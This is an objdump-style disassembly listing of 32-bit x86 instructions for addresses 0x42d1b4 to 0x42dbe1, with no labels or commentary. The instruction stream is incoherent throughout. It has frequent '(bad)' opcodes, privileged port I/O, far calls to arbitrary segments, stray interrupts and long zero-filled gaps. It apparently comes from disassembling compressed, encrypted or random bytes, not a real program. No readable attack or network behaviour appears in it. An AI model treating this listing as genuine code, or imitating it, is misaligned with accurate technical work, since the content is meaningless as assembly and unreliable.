  42d1b4:	mov    ds,WORD PTR [ebx-0x63bf22f]
  42d1ba:	sbb    ebx,eax
  42d1bc:	mov    al,ds:0x75a41ea9
  42d1c1:	jecxz  0x42d154
  42d1c3:	scas   eax,DWORD PTR es:[edi]
  42d1c4:	retf   
  42d1c5:	inc    edi
  42d1c6:	pop    eax
  42d1c7:	in     al,0xfd
  42d1c9:	inc    edx
  42d1cb:	fmulp  st(5),st
  42d1cd:	imul   DWORD PTR [ebp+eax*1+0x43bcefd5]
  42d1d4:	call   0x1cdc:0xde12a409
  42d1db:	fidivr WORD PTR [edx]
  42d1dd:	int3   
  42d1de:	pop    ss
  42d1df:	dec    esp
  42d1e0:	xor    eax,0x9b3e1f6b
  42d1e5:	xor    eax,0x10dc7a41
  42d1ea:	mov    WORD PTR [eax+0x3c2a9bc9],ds
  42d1f0:	cmp    eax,0x55bc099a
  42d1f5:	cdq    
  42d1f6:	pop    ebx
  42d1f7:	in     al,dx
  42d1f8:	call   0xb684:0x6ea885ab
  42d1ff:	popf   
  42d200:	fbld   TBYTE PTR [esi+0x6cc954f9]
  42d206:	retf   0xec93
  42d209:	sbb    al,BYTE PTR [edx]
  42d20b:	dec    eax
  42d20c:	push   esi
  42d20d:	(bad)  
  42d20f:	inc    ebx
  42d210:	add    DWORD PTR [eax],0x0
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2a6
  42d281:	outs   dx,DWORD PTR ds:[esi]
  42d282:	lods   al,BYTE PTR ds:[esi]
  42d283:	pop    ebx
  42d284:	sbb    eax,0x50001e4
  42d289:	add    DWORD PTR [eax],eax
  42d28b:	add    BYTE PTR [eax+edx*8],dl
  42d28e:	mov    esp,0x2ceebda1
  42d293:	inc    ebx
  42d294:	and    al,0xc6
  42d296:	sub    al,ah
  42d298:	pop    ds
  42d299:	loopne 0x42d23d
  42d29b:	adc    eax,0x28814313
  42d2a0:	xor    DWORD PTR [ebx+0x531264f6],esi
  42d2a6:	ss mov ch,0xa3
  42d2a9:	cmp    al,0xeb
  42d2ab:	or     edi,edi
  42d2ad:	aaa    
  42d2ae:	jnp    0x42d273
  42d2b0:	xchg   ecx,eax
  42d2b1:	rcl    BYTE PTR [esi-0x4948b503],cl
  42d2b7:	pop    edx
  42d2b8:	sub    BYTE PTR [ebp-0x6e026828],bh
  42d2be:	pushf  
  42d2bf:	gs jg  0x42d2e9
  42d2c2:	sbb    BYTE PTR ds:0x1899ff06,al
  42d2c8:	rol    DWORD PTR [ebx-0x2a1903c],1
  42d2ce:	mov    cl,0x40
  42d2d0:	xchg   edx,eax
  42d2d1:	gs mov al,0xd
  42d2d4:	sbb    ah,dh
  42d2d6:	pusha  
  42d2d7:	pop    esi
  42d2d8:	ins    BYTE PTR es:[edi],dx
  42d2d9:	mov    al,0xeb
  42d2db:	mov    dh,cl
  42d2dd:	mov    ecx,0x5ea45240
  42d2e2:	stos   BYTE PTR es:[edi],al
  42d2e3:	imul   edi,DWORD PTR [ecx+ebp*1],0x1acea002
  42d2ea:	pop    ecx
  42d2eb:	in     eax,dx
  42d2ec:	fwait
  42d2ed:	dec    eax
  42d2ee:	in     al,0x40
  42d2f0:	test   bh,cl
  42d2f2:	and    eax,0xda9ac656
  42d2f7:	dec    edi
  42d2f8:	jno    0x42d35d
  42d2fa:	cwde   
  42d2fb:	test   eax,0x6a817e5a
  42d300:	jge    0x42d345
  42d302:	dec    ebx
  42d303:	fidivr WORD PTR [esi]
  42d305:	adc    eax,0x6d7716ba
  42d30a:	cwde   
  42d30b:	or     DWORD PTR [edx],edx
  42d30d:	adc    BYTE PTR [esi+0x16],bh
  42d310:	inc    esp
  42d311:	sahf   
  42d312:	mov    ds:0xf3400f1c,al
  42d317:	mov    ds:0xbb872f5a,eax
  42d31c:	cmp    eax,0xa62d6ca2
  42d321:	mov    bl,0x7e
  42d323:	cmp    BYTE PTR [ecx-0x6b106f6c],al
  42d329:	dec    ebp
  42d32a:	shl    BYTE PTR [edx-0x3b],cl
  42d32d:	cwde   
  42d32e:	rep stos BYTE PTR es:[edi],al
  42d330:	aas    
  42d331:	into   
  42d332:	mov    DWORD PTR [edi],ecx
  42d334:	or     DWORD PTR [eax],ebp
  42d336:	xchg   DWORD PTR [ebx-0x28],ebx
  42d339:	cs mov eax,0x819b6c13
  42d33f:	jmp    0x42d382
  42d341:	enter  0x2482,0x53
  42d345:	outs   dx,DWORD PTR cs:[esi]
  42d347:	pop    ecx
  42d348:	cmp    BYTE PTR [ebx+0x393f6af2],ah
  42d34e:	xor    DWORD PTR [edx+0x2d44b542],0x12a75446
  42d358:	rcr    DWORD PTR cs:[edi-0x279d1685],cl
  42d35f:	xor    al,0xf3
  42d361:	(bad)  
  42d362:	mov    al,0xad
  42d364:	and    al,0x7d
  42d366:	or     eax,0x140cbb2
  42d36b:	and    DWORD PTR [edi],ebx
  42d36d:	(bad)  
  42d36f:	and    DWORD PTR [edi],esi
  42d371:	into   
  42d372:	fisub  DWORD PTR [edi]
  42d374:	xor    dl,0x48
  42d377:	and    eax,0x965181e5
  42d37c:	and    BYTE PTR [ecx-0x36391062],ch
  42d382:	adc    eax,0x5045df6f
  42d387:	push   ss
  42d388:	cmp    al,0x20
  42d38a:	jae    0x42d33c
  42d38c:	clc    
  42d38d:	rcl    BYTE PTR [ecx-0x61],cl
  42d390:	and    BYTE PTR [eax],al
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	and    al,0xd2
  42d402:	xchg   esp,eax
  42d403:	and    DWORD PTR [edx],0x50001e5
  42d409:	add    DWORD PTR [eax],eax
  42d40b:	add    cl,bh
  42d40d:	jno    0x42d471
  42d40f:	std    
  42d410:	xor    bh,BYTE PTR [edi+0x7e]
  42d413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d414:	out    0xb3,al
  42d416:	or     al,0x27
  42d418:	dec    esp
  42d419:	push   es
  42d41a:	(bad)  
  42d41b:	push   eax
  42d41c:	mov    cl,0x5d
  42d41e:	add    al,0x6c
  42d420:	das    
  42d421:	inc    esi
  42d422:	dec    edi
  42d423:	jecxz  0x42d3d2
  42d425:	xchg   esi,eax
  42d426:	call   0xff27138b
  42d42b:	push   0x37
  42d42d:	mov    dl,0x35
  42d42f:	leave  
  42d430:	push   0x7
  42d432:	stc    
  42d433:	push   esi
  42d434:	mul    esp
  42d436:	and    edi,eax
  42d438:	std    
  42d439:	dec    eax
  42d43a:	pop    es
  42d43b:	add    BYTE PTR [ebp+0x60d370ea],bl
  42d441:	dec    esp
  42d442:	out    dx,eax
  42d443:	jmp    0x4edc:0x36b8e0eb
  42d44a:	call   0xbc001c90
  42d44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d450:	mov    eax,ds:0xafbca9a9
  42d455:	jbe    0x42d48c
  42d457:	xor    DWORD PTR [ebx+0x55ab6dba],esi
  42d45d:	sysret 
  42d45f:	jns    0x42d436
  42d461:	call   0x8455:0x3e0e1136
  42d468:	and    bh,BYTE PTR [esi-0x25]
  42d46b:	stos   BYTE PTR es:[edi],al
  42d46c:	je     0x42d405
  42d46e:	lock pop ebp
  42d470:	dec    esp
  42d471:	mov    ebx,0x7a92af9
  42d476:	(bad)  
  42d477:	ins    DWORD PTR es:[edi],dx
  42d478:	scas   al,BYTE PTR es:[edi]
  42d479:	xor    dh,BYTE PTR [edx-0x37]
  42d47c:	retf   
  42d47d:	push   ebx
  42d47e:	push   0x73
  42d480:	push   cs
  42d481:	dec    ebx
  42d482:	mov    ah,0x16
  42d484:	into   
  42d485:	pop    ecx
  42d486:	pop    ebx
  42d487:	cmove  ecx,DWORD PTR [edi+0x6c]
  42d48b:	aam    0xf5
  42d48d:	xor    edx,0x6b
  42d490:	sub    al,BYTE PTR [eax+0x171581ec]
  42d496:	mov    esi,0xaa10b3df
  42d49b:	push   ss
  42d49c:	or     ebx,DWORD PTR [esp+edx*4+0x136b3e09]
  42d4a3:	push   cs
  42d4a4:	push   ecx
  42d4a5:	stos   DWORD PTR es:[edi],eax
  42d4a6:	fwait
  42d4a7:	retf   
  42d4a8:	and    DWORD PTR [esi],0xcee464d6
  42d4ae:	ret    
  42d4af:	out    0x19,al
  42d4b1:	mov    edi,0xc2bb1a6c
  42d4b6:	push   edx
  42d4b7:	sub    esi,DWORD PTR [edx-0x421aa413]
  42d4bd:	(bad)  
  42d4be:	jne    0x42d4e0
  42d4c0:	push   cs
  42d4c1:	jmp    0x896cf9cf
  42d4c6:	ins    DWORD PTR es:[edi],dx
  42d4c7:	push   edi
  42d4c8:	or     DWORD PTR [edi-0x37],ebx
  42d4cb:	push   eax
  42d4cc:	and    BYTE PTR [esi+0x20],dl
  42d4cf:	jle    0x42d48d
  42d4d1:	and    DWORD PTR [edx],ebx
  42d4d3:	or     al,0xec
  42d4d5:	adc    al,0xe3
  42d4d8:	adc    cl,ah
  42d4da:	outs   dx,DWORD PTR ds:[esi]
  42d4db:	mov    ebp,edi
  42d4dd:	sahf   
  42d4de:	mov    edx,0xaf941faf
  42d4e3:	add    eax,0xc55ff401
  42d4e8:	shl    BYTE PTR [eax-0x4c0ed2e6],1
  42d4ee:	add    eax,0xf3b389f
  42d4f3:	mov    esp,0x17298bd9
  42d4f8:	sub    dh,BYTE PTR [eax]
  42d4fa:	or     eax,0x2a23d938
  42d4ff:	dec    ebx
  42d500:	adc    ebx,DWORD PTR [eax+ebx*2-0x70]
  42d504:	sub    DWORD PTR [ecx-0x66],ebx
  42d507:	mov    al,0xf1
  42d509:	fist   DWORD PTR [eax]
  42d50b:	out    dx,al
  42d50c:	dec    esi
  42d50d:	jne    0x42d4c6
  42d50f:	scas   eax,DWORD PTR es:[edi]
  42d510:	js     0x42d512
	...
  42d572:	add    BYTE PTR [eax],al
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0x21a07d5,eax
  42d583:	in     eax,dx
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0x59000001,al
  42d58d:	(bad)  
  42d58f:	sub    BYTE PTR [edx-0x77],dl
  42d592:	es pop ecx
  42d594:	scas   al,BYTE PTR es:[edi]
  42d595:	pop    edx
  42d596:	or     DWORD PTR [eax-0x18],ebx
  42d599:	jl     0x42d5ba
  42d59b:	or     eax,0x665ec05e
  42d5a0:	retf   0xc86c
  42d5a3:	nop
  42d5a4:	loopne 0x42d52c
  42d5a6:	cmp    al,0x21
  42d5a8:	shl    bh,0x34
  42d5ab:	cmc    
  42d5ac:	into   
  42d5ad:	cmc    
  42d5ae:	push   ebp
  42d5af:	inc    esi
  42d5b0:	push   edx
  42d5b1:	pusha  
  42d5b2:	shl    DWORD PTR [esi-0x5bb20ee2],0x23
  42d5b9:	mov    dl,0xd9
  42d5bb:	pop    ebp
  42d5bc:	add    ecx,edx
  42d5be:	jnp    0x42d5ea
  42d5c0:	in     eax,dx
  42d5c1:	lock inc eax
  42d5c3:	jle    0x42d635
  42d5c5:	dec    edi
  42d5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5c7:	popf   
  42d5c8:	test   BYTE PTR [edx-0x73],ch
  42d5cb:	dec    esp
  42d5cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5cd:	inc    esp
  42d5ce:	into   
  42d5cf:	(bad)  
  42d5d0:	in     al,dx
  42d5d1:	xchg   edi,eax
  42d5d2:	pop    es
  42d5d3:	pop    esp
  42d5d4:	in     al,0x22
  42d5d6:	and    BYTE PTR [edi-0x1b],dl
  42d5d9:	rcl    BYTE PTR [ebx],0xae
  42d5dc:	and    eax,0xda121f45
  42d5e1:	dec    esi
  42d5e2:	inc    ecx
  42d5e3:	sbb    BYTE PTR fs:[ebp+esi*4+0x40be897a],dh
  42d5eb:	sub    eax,0x2306f8da
  42d5f0:	pop    ds
  42d5f1:	push   cs
  42d5f2:	clc    
  42d5f3:	enter  0x7348,0xdf
  42d5f7:	adc    dh,bh
  42d5f9:	aas    
  42d5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5fb:	(bad)  
  42d5fc:	sahf   
  42d5fd:	pop    esi
  42d5fe:	mov    esp,0x9b662220
  42d603:	sub    eax,0xff1889e
  42d608:	push   ds
  42d609:	pop    es
  42d60a:	sahf   
  42d60b:	inc    ebp
  42d60c:	aad    0x8c
  42d60e:	mov    al,0x35
  42d610:	xchg   ebp,eax
  42d611:	scas   eax,DWORD PTR es:[edi]
  42d612:	xor    al,0xb9
  42d614:	inc    eax
  42d615:	out    0x19,eax
  42d617:	lea    ebx,[esi]
  42d619:	and    eax,0xa682bc01
  42d61e:	mov    eax,0x46d556ec
  42d623:	dec    edi
  42d624:	stc    
  42d625:	mov    ds:0x34f3bdb2,al
  42d62a:	dec    edi
  42d62b:	test   eax,0xb906b544
  42d630:	adc    al,BYTE PTR [edx-0x41]
  42d633:	mov    ebp,0xaef28755
  42d638:	ss mov bh,0x8e
  42d63b:	jbe    0x42d670
  42d63d:	scas   eax,DWORD PTR es:[edi]
  42d63e:	clc    
  42d63f:	and    BYTE PTR [eax+0x75487f1f],bh
  42d645:	loopne 0x42d5fc
  42d647:	ret    
  42d648:	cli    
  42d649:	retf   0xc2bb
  42d64c:	pop    edi
  42d64d:	aad    0xeb
  42d64f:	dec    ebx
  42d650:	jb     0x42d5f4
  42d652:	stos   DWORD PTR es:[edi],eax
  42d653:	fiadd  WORD PTR [ecx+eiz*8+0x6197aa58]
  42d65a:	ss std 
  42d65c:	test   al,0x12
  42d65e:	jle    0x42d6ac
  42d660:	jge    0x42d5ff
  42d662:	or     ecx,DWORD PTR [ebx+0x43]
  42d665:	mov    al,0xd9
  42d667:	fild   QWORD PTR [ebx-0xdaf4a6a]
  42d66d:	in     eax,0xbb
  42d66f:	loope  0x42d6e6
  42d671:	lea    esi,[ebx+0xed8b6f0]
  42d677:	test   al,0x92
  42d679:	cwde   
  42d67a:	scas   al,BYTE PTR es:[edi]
  42d67b:	fdivrp st(7),st
  42d67d:	xor    BYTE PTR [edi-0x32],ah
  42d680:	add    BYTE PTR [ebp-0x28],ch
  42d683:	add    al,0x31
  42d685:	cmp    eax,0x3a3d8035
  42d68a:	(bad)
  42d690:	data16 add BYTE PTR [eax],al
	...
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xf3
  42d701:	xor    dl,BYTE PTR [eax+ebx*2]
  42d704:	sub    al,0xe7
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0x64000001
  42d70d:	cmc    
  42d70e:	stos   BYTE PTR es:[edi],al
  42d70f:	add    eax,0x874eaa1b
  42d714:	mov    eax,ds:0x8f3ec694
  42d719:	xchg   DWORD PTR [ecx+0x104cd565],edi
  42d71f:	pop    esi
  42d720:	aaa    
  42d721:	arpl   WORD PTR [ecx+0x45b8168],dx
  42d727:	dec    ebp
  42d728:	lea    ebx,[eax+0x2907634]
  42d72e:	lds    ebx,FWORD PTR [edi-0x7b]
  42d731:	mov    esp,0xfdf393be
  42d736:	mov    al,ds:0x62f3e4a2
  42d73b:	shl    DWORD PTR [edi],0xa3
  42d73e:	repnz test BYTE PTR [edi],al
  42d741:	inc    esp
  42d742:	add    eax,0x71bc582e
  42d747:	lahf   
  42d748:	adc    al,0xb8
  42d74a:	or     al,0xc6
  42d74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d74d:	cmp    al,0x4b
  42d74f:	and    bl,ch
  42d751:	and    ah,BYTE PTR [ecx+eiz*8+0x2d]
  42d755:	xchg   DWORD PTR [eax],ebp
  42d757:	les    esp,FWORD PTR [esi]
  42d759:	jle    0x42d7c4
  42d75b:	retf   
  42d75c:	fiadd  DWORD PTR [ebx+0x3bd790b5]
  42d762:	mov    ecx,0x43f49ab1
  42d767:	fwait
  42d768:	jnp    0x42d6f0
  42d76a:	in     al,dx
  42d76b:	lods   eax,DWORD PTR ds:[esi]
  42d76c:	imul   ebp,DWORD PTR [eax+0x103c94f1],0x38
  42d773:	jge    0x42d7b7
  42d775:	mov    ss,edx
  42d777:	std    
  42d778:	(bad)  
  42d779:	lahf   
  42d77a:	and    DWORD PTR [ecx+edi*2-0x1d0c3d32],esp
  42d781:	out    0xd1,al
  42d783:	push   cs
  42d784:	sbb    BYTE PTR [edx],0x3f
  42d787:	out    0x3f,eax
  42d789:	fisttp DWORD PTR [ebx-0x6deaa2e2]
  42d78f:	and    al,0x38
  42d791:	dec    edi
  42d792:	push   esp
  42d793:	mov    ecx,ecx
  42d795:	call   0x262b0978
  42d79a:	ret    
  42d79b:	(bad)  
  42d79c:	jecxz  0x42d792
  42d79e:	lds    esi,FWORD PTR [ebp-0x22]
  42d7a1:	aad    0x54
  42d7a3:	fild   DWORD PTR [edx+esi*8-0x2c]
  42d7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7a8:	lods   al,BYTE PTR ds:[esi]
  42d7a9:	push   eax
  42d7aa:	out    0x88,al
  42d7ac:	(bad)  
  42d7ad:	push   esi
  42d7ae:	shl    DWORD PTR [eax],cl
  42d7b0:	or     al,0xe7
  42d7b2:	dec    edi
  42d7b3:	mov    esi,0xc7ed245e
  42d7b8:	mov    ebx,edi
  42d7ba:	lock cmp eax,0xd5b96f21
  42d7c0:	adc    DWORD PTR [edi],0xffffffd3
  42d7c3:	test   BYTE PTR [ecx+0x3f79bc5f],dl
  42d7c9:	test   DWORD PTR es:[ebp-0x5e],ecx
  42d7cd:	inc    esi
  42d7ce:	pop    ebp
  42d7cf:	into   
  42d7d0:	inc    ebx
  42d7d1:	cmp    ch,bh
  42d7d3:	mov    ?,WORD PTR [eax-0x593fd3d8]
  42d7d9:	sub    dh,0xe
  42d7dc:	test   eax,0x8d707377
  42d7e1:	mov    ch,0x38
  42d7e3:	test   BYTE PTR [ebx+edx*1+0x6],bh
  42d7e7:	xchg   ah,al
  42d7e9:	cmc    
  42d7ea:	fsub   st(0),st
  42d7ec:	push   eax
  42d7ed:	inc    ebx
  42d7ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7ef:	jae    0x42d86f
  42d7f1:	pop    edi
  42d7f2:	aas    
  42d7f3:	fwait
  42d7f4:	nop
  42d7f5:	and    DWORD PTR [ebp-0x3f],0x107f1957
  42d7fc:	rcl    BYTE PTR [ecx+ebx*4],1
  42d7ff:	mov    ebx,0x8089e117
  42d804:	fld    st(4)
  42d806:	js     0x42d795
  42d808:	pop    ds
  42d809:	ror    DWORD PTR [eax+0x74b82042],1
  42d80f:	or     cl,ch
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xe4c6961a
  42d881:	add    al,0x4e
  42d883:	call   0x44c0b9
  42d888:	add    eax,0x27000001
  42d88d:	xchg   DWORD PTR ds:[edx-0x1244c13a],esi
  42d894:	(bad)  
  42d896:	(bad)  
  42d898:	mov    ebp,0xf76413fc
  42d89d:	push   eax
  42d89e:	mov    cl,0xf0
  42d8a0:	clc    
  42d8a1:	and    bl,BYTE PTR [ebp-0x3f]
  42d8a4:	adc    DWORD PTR [eax-0x28],esp
  42d8a7:	daa    
  42d8a8:	mov    bh,BYTE PTR [eax-0x75]
  42d8ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8ac:	xchg   esp,eax
  42d8ad:	inc    ebx
  42d8ae:	iret   
  42d8af:	pop    ds
  42d8b0:	xor    ah,BYTE PTR [ebx+edx*8]
  42d8b3:	and    eax,0x36e6c115
  42d8b8:	(bad)  
  42d8b9:	push   ebp
  42d8ba:	inc    eax
  42d8bb:	aaa    
  42d8bc:	or     ecx,DWORD PTR [edx-0x629aca25]
  42d8c2:	ret    
  42d8c3:	loop   0x42d86b
  42d8c5:	jl     0x42d881
  42d8c7:	bound  eax,QWORD PTR [ebp-0xc2aec68]
  42d8cd:	popa   
  42d8ce:	mov    al,ds:0x9369d188
  42d8d3:	out    0xc7,al
  42d8d5:	xchg   DWORD PTR [ecx+0x8b7db87],esp
  42d8db:	jne    0x42d8d8
  42d8dd:	das    
  42d8de:	xlat   BYTE PTR ds:[ebx]
  42d8df:	push   ecx
  42d8e0:	jnp    0x42d8e5
  42d8e2:	mov    ebx,0x79118e90
  42d8e7:	mov    esi,0xc066dd1
  42d8ec:	ficom  DWORD PTR ds:0x4e734696
  42d8f2:	(bad)  
  42d8f3:	mov    eax,0x3f1d4251
  42d8f8:	loopne 0x42d8a4
  42d8fa:	pop    edi
  42d8fb:	xlat   BYTE PTR ds:[ebx]
  42d8fc:	jge    0x42d90e
  42d8fe:	mov    ecx,0x39903e35
  42d903:	addr16 aaa 
  42d905:	or     al,BYTE PTR [edi-0x1b]
  42d908:	aam    0xdf
  42d90a:	retf   
  42d90b:	loopne 0x42d933
  42d90d:	sub    al,0x4c
  42d90f:	hlt    
  42d910:	icebp  
  42d911:	(bad)  
  42d912:	xor    eax,0x59d56e43
  42d917:	inc    ebx
  42d918:	addr16 push ds
  42d91a:	mov    esp,DWORD PTR [ebx+0x13f4682b]
  42d920:	fisubr DWORD PTR [ebx]
  42d922:	push   eax
  42d923:	sub    DWORD PTR [edx-0x34b4a54a],eax
  42d929:	int3   
  42d92a:	sub    al,al
  42d92c:	xor    al,ch
  42d92e:	mov    ecx,0x3496ff11
  42d933:	rol    edi,cl
  42d935:	mov    ds:0x1f598052,al
  42d93a:	jmp    0x703f:0xbd2c031e
  42d941:	es jg  0x42d8eb
  42d944:	lahf   
  42d945:	shr    ebx,cl
  42d947:	jmp    0x4055:0x69d910cf
  42d94e:	icebp  
  42d94f:	mov    bl,0xe7
  42d951:	std    
  42d952:	ins    DWORD PTR es:[edi],dx
  42d953:	mov    ch,dh
  42d955:	int3   
  42d956:	or     al,BYTE PTR [ecx+0x633ba47f]
  42d95c:	clc    
  42d95d:	pop    eax
  42d95e:	bnd jg 0x42d9d6
  42d961:	stos   DWORD PTR es:[edi],eax
  42d962:	add    ebp,DWORD PTR [ebx+0x72]
  42d965:	ret    
  42d966:	clc    
  42d967:	adc    BYTE PTR [ecx],bh
  42d969:	lds    eax,FWORD PTR ds:0x8496dbf4
  42d96f:	pop    ecx
  42d970:	ins    DWORD PTR es:[edi],dx
  42d971:	inc    ebp
  42d972:	and    al,0x37
  42d974:	and    eax,0x5dbc0bb8
  42d979:	adc    edx,edi
  42d97b:	sub    BYTE PTR [ecx-0x55c56536],dl
  42d981:	add    dh,BYTE PTR [eax-0x5581d6bd]
  42d987:	pop    eax
  42d988:	adc    al,0x69
  42d98a:	mov    dl,0x68
  42d98c:	and    BYTE PTR [esi+0x7e],bl
  42d98f:	repz cmp al,BYTE PTR [eax]
	...
  42d9f2:	add    BYTE PTR [eax],al
  42d9f4:	stc    
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	jno    0x42d998
  42da02:	rcr    DWORD PTR [esi+esi*1],1
  42da05:	jmp    0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	push   cs
  42da0d:	dec    ebp
  42da0e:	and    eax,DWORD PTR [esi]
  42da10:	adc    cl,BYTE PTR [ebp+0x1b]
  42da13:	out    0xc2,eax
  42da15:	jbe    0x42da20
  42da17:	jne    0x42da82
  42da19:	loop   0x42d9c3
  42da1b:	mov    ebp,0x5df61912
  42da20:	dec    ecx
  42da21:	mov    esp,0xfb181ce7
  42da26:	out    dx,eax
  42da27:	pop    esp
  42da28:	es and al,0x7e
  42da2b:	jle    0x42da83
  42da2d:	fisttp WORD PTR [edx+0x46c3f934]
  42da33:	packuswb mm7,QWORD PTR [ebx]
  42da36:	in     al,dx
  42da37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da38:	iret   
  42da39:	mov    ebp,0xb7acddd3
  42da3e:	test   BYTE PTR [ecx+eiz*4-0x17d66ef2],cl
  42da45:	push   0x6d
  42da47:	scas   eax,DWORD PTR es:[edi]
  42da48:	adc    al,0x75
  42da4a:	pop    ss
  42da4b:	addr16 pop ecx
  42da4d:	jg     0x42da4d
  42da4f:	in     eax,0x69
  42da51:	sub    edx,DWORD PTR [ebx+eiz*2]
  42da54:	jmp    0x42d9d9
  42da56:	test   DWORD PTR [esi],eax
  42da58:	adc    eax,0xe58aba31
  42da5d:	mov    BYTE PTR [ebx],cl
  42da5f:	cld    
  42da60:	pop    es
  42da61:	pop    ebp
  42da62:	shl    DWORD PTR [ecx+0xa699373],cl
  42da68:	popf   
  42da69:	out    0xfc,eax
  42da6b:	call   0x8e85dec0
  42da70:	call   0xd641917d
  42da75:	jg     0x42da08
  42da77:	ds mov al,0xf9
  42da7a:	pop    ecx
  42da7b:	enter  0x6b11,0xff
  42da7f:	dec    ebp
  42da80:	and    DWORD PTR [ecx-0x77],eax
  42da83:	into   
  42da84:	xor    esp,esp
  42da86:	shl    DWORD PTR [esi-0x22ee5d9f],1
  42da8c:	dec    esi
  42da8d:	outs   dx,DWORD PTR ds:[esi]
  42da8e:	addr16 (bad) 
  42da90:	les    edi,FWORD PTR [eax]
  42da92:	pop    DWORD PTR [ecx+0x2d]
  42da95:	in     al,0xf3
  42da97:	cmc    
  42da98:	jns    0x42dadb
  42da9a:	clc    
  42da9b:	(bad)  
  42da9c:	adc    al,0xca
  42da9e:	add    DWORD PTR [edx+0x20],0xc370e791
  42daa5:	iret   
  42daa6:	shl    DWORD PTR [ecx+0x5d],0x19
  42daaa:	pusha  
  42daab:	cmp    DWORD PTR [esi-0x43],esp
  42daae:	xchg   edi,eax
  42daaf:	xchg   esp,eax
  42dab0:	fwait
  42dab1:	push   esp
  42dab2:	and    DWORD PTR ds:0x4f4dc08,edi
  42dab8:	jns    0x42dacf
  42daba:	repnz dec eax
  42dabc:	or     DWORD PTR [edx-0x62],esi
  42dabf:	cmp    BYTE PTR [ebx*2-0x2f314270],al
  42dac6:	enter  0xbadb,0x93
  42daca:	in     eax,dx
  42dacb:	ins    BYTE PTR es:[edi],dx
  42dacc:	cdq    
  42dacd:	es xchg edi,eax
  42dacf:	add    al,0x80
  42dad1:	adc    al,0xe
  42dad3:	sbb    ebp,edi
  42dad5:	cmc    
  42dad6:	rol    DWORD PTR [ebx-0x446e8ee8],1
  42dadc:	shl    DWORD PTR ds:[eax+eax*1],0x43
  42dae1:	inc    edx
  42dae2:	adc    eax,0x264bf5e2
  42dae7:	sbb    al,0xa8
  42dae9:	xor    al,0x91
  42daeb:	aas    
  42daec:	sub    DWORD PTR [ebp+0x6e5220c0],edi
  42daf2:	add    al,0x85
  42daf4:	ret    0x737
  42daf7:	pop    edx
  42daf8:	adc    esp,esi
  42dafa:	jp     0x42da81
  42dafc:	inc    edx
  42dafd:	cmp    eax,esi
  42daff:	mov    edx,0xc5d74cfd
  42db04:	sbb    al,cl
  42db06:	aad    0xfc
  42db08:	fbstp  TBYTE PTR ss:[ecx-0x2]
  42db0c:	cli    
  42db0d:	xor    DWORD PTR [edi+0x9fc7],esi
	...
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db52
  42db81:	pop    edx
  42db82:	ret    
  42db83:	or     BYTE PTR [ebx],bh
  42db85:	jmp    0x0:0x1050001
  42db8c:	adc    al,0x88
  42db8e:	test   esi,esi
  42db90:	jg     0x42db13
  42db92:	sub    edx,ebp
  42db94:	clc    
  42db95:	ds test al,0x34
  42db98:	jmp    0x1160:0x5cc9ae6f
  42db9f:	mov    esp,0xfc26938c
  42dba4:	adc    BYTE PTR [edx-0x32],0xe6
  42dba8:	int    0xb0
  42dbaa:	enter  0x95fd,0xa
  42dbae:	mov    ebp,0xf1e9fa5e
  42dbb3:	jns    0x42dbf3
  42dbb5:	int3   
  42dbb6:	jmp    0x42dc16
  42dbb8:	and    BYTE PTR ds:0xd8bea728,bl
  42dbbe:	push   es
  42dbbf:	jno    0x42db5d
  42dbc1:	sub    bl,bl
  42dbc3:	pop    es
  42dbc4:	inc    edi
  42dbc5:	inc    ecx
  42dbc6:	cmp    DWORD PTR [ecx+0x55],0xffffffa1
  42dbca:	inc    esi
  42dbcb:	and    DWORD PTR [edx],eax
  42dbcd:	xlat   BYTE PTR ds:[ebx]
  42dbce:	inc    edx
  42dbcf:	outs   dx,BYTE PTR ds:[esi]
  42dbd0:	adc    BYTE PTR [esi-0x4a408d67],bl
  42dbd6:	stos   DWORD PTR es:[edi],eax
  42dbd7:	adc    esp,DWORD PTR [ebx+0x4f]
  42dbda:	or     eax,0x98ccb63c
  42dbdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbe0:	dec    ecx
  42dbe1:	add    ebp,DWORD PTR [ebp-0x15]
